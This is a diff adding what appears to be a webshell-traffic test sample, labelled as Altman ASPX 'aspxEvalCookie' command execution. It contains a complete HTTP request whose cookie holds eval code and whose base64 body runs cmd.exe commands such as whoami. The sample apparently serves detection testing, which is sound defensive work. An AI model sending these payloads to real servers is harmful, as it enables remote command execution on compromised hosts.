@@ -1,0 +1,13 @@
+# webshell活动_Altman_ASPX_aspxEvalCookie_命令执行
+# Altman3是一款渗透测试软件，基于.Net4.0开发，依托Eto.Form可以完美运行在Windows、Linux、Mac等多个平台。
+# 攻击者通过Altman webshell工具建立连接，执行任意命令。将执行的命令通过base64编码，并将解码方式放在cookie中，webshell以cookie方式接受传递的参数
+POST /shell.aspx?acid=80002250&bid=hd_tag_m8mv25mp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25mp
+RM-PRO-Token: e116852167fd201e084751b078a403dc
+RM-PRO-Time: 1742808482191
+cookie: cmd=Response.Write(%22-%3e%7c%22)%3b%0d%0avar+err%3aException%3b%0d%0atry%0d%0a%7b%0d%0a%09var+item%3dRequest.Item%5b%22q%22%5d%3b%0d%0a%09eval(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(item))%2c%22unsafe%22)%3b%0d%0a%7d%0d%0acatch(err)%0d%0a%7b%0d%0a%09Response.Write(%22ERROR%3a%2f%2f%22%2berr.message)%3b%0d%0a%7d%0d%0aResponse.Write(%22%7c%3c-%22)%3b%0d%0aResponse.End()%3b
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Content-Type: application/x-www-form-urlencoded
+
+q=dmFyIGV4ZT1TeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiaSJdKSk7DQp2YXIgY29tbWFuZD1TeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiZSJdKSk7DQp2YXIgaW5mbz1uZXcgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8oKTsNCmluZm8uRmlsZU5hbWU9ZXhlOw0KaW5mby5Bcmd1bWVudHM9Ii9DICIgKyBjb21tYW5kOw0KaW5mby5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7DQppbmZvLlJlZGlyZWN0U3RhbmRhcmRJbnB1dD1mYWxzZTsNCmluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlOw0KaW5mby5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTsNCnZhciBwPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpOw0KcC5TdGFydEluZm89aW5mbzsNCnAuU3RhcnQoKTsNCnZhciBvdXRwdXQ6U3RyaW5nPXAuU3RhbmRhcmRPdXRwdXQuUmVhZFRvRW5kKCk7DQp2YXIgZXJyb3I6U3RyaW5nPXAuU3RhbmRhcmRFcnJvci5SZWFkVG9FbmQoKTsNCnAuQ2xvc2UoKTsNClJlc3BvbnNlLldyaXRlKG91dHB1dCtlcnJvcik7&i=Y21k&e=Y2QgL2QgIkM6XGluZXRwdWJcd3d3cm9vdCImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd
